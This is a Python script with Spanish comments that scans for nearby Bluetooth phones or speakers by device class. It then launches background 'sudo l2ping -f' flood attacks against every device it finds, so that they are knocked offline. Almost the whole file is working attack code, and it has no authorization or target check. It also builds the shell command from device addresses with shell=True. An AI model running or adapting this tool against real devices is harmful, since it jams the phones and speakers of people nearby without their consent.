import argparse
import subprocess
from Scanner import Scanner
from constants import PHONE_BRANDS, SPEAKER_BRANDS, SPEAKER_KEYWORDS

class Deauther:
    def __init__(self, adapter=1):
        self.adapter = adapter

    def deauth_device(self, device_mac):
        """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
        try:
            command = f"sudo l2ping -i {self.adapter} -f {device_mac}"
            print(f"Enviando un ataque flood a {device_mac} via adapter {self.adapter}...")
            # esto se corre en background para que sea continuo
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # opcionalmente podemos almacenar el proceso y terminarlo despues
            return True
        except FileNotFoundError:
            print("Error: comando l2ping no encontrado. Verifique que este isntalado.")
            return False
        except Exception as e:
            print(f"Un error ocurrio durante la deautenticacion: {e}.")
            return False
            
# Speaker Deauthorizer
class SpeakerDeauthorizer:
    def __init__(self, scanner, deauther):
        self.scanner = scanner
        self.deauther = deauther

    def deauthorize_devices(self, major_device_class):
        """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
        device_type_name = ""
        if major_device_class == 2:
            device_type_name = "Mobile Phones"
        elif major_device_class == 4:
            device_type_name = "Bluetooth Speakers"
        else:
            device_type_name =f"devices with major class ID {major_device_class}"

        print(f"Iniciando Deauth {device_type_name}...")
        devices = self.scanner.scan_for_devices(major_device_class=major_device_class)
        
        if not devices:
            print(f"No se encontraron {device_type_name} ofensores")
            return

        print(f"\n{device_type_name} encontrados:")
        for device_mac in devices:
            print(f"- {device_mac}")

        print(f"\nIniciando Deauth de {device_type_name} ofensores...")
        for device_mac in devices:
            print(f"\nIntentando Deauth {device_type_name} {device_mac}...")
            self.deauther.deauth_device(device_mac)

        print(f"\nProceso de Deauth iniciado para todos los {device_type_name} encontrados.")

class SpeakerDeauthorizerRunner:
    @staticmethod
    def run():
        parser = argparse.ArgumentParser(description="Deauthorize Bluetooth devices by major class ID.")
        parser.add_argument("major_class", type=int, help="Major Class ID de dispositivos a atacar; 4 para parlantes, 2 para telefonos.")
        args = parser.parse_args()

        adapter_id = 1
        major_device_class = args.major_class

        scanner = Scanner(adapter=adapter_id)
        deauther = Deauther(adapter=adapter_id)
        speaker_deautherizer = SpeakerDeauthorizer(scanner,deauther)
        speaker_deautherizer.deauthorize_devices(major_device_class)

if __name__ == "__main__":
    SpeakerDeauthorizerRunner.run()
